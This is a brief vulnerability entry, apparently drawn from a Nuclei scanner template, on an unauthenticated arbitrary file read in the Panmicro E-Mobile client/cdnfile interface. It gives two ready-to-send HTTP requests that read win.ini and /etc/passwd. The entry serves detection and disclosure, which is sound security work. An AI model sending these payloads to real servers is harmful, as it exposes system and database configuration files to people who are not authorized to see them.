# Vulnerability: Panmicro E-Mobile System - Arbitrary File Read
**Classification:** PANMICRO
**Source:** Nuclei Template (`panmicro-arbitrary-file-read.yaml`)

## Description
The Panmicro E-Mobile client/cdnfile interface has an arbitrary file reading vulnerability. Unauthenticated attackers can use this vulnerability to read important system files, database configuration files, and so on.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/client/cdnfile/1C/Windows/win.ini?windows
GET {{BaseURL}}/client/cdnfile/C/etc/passwd?linux
```

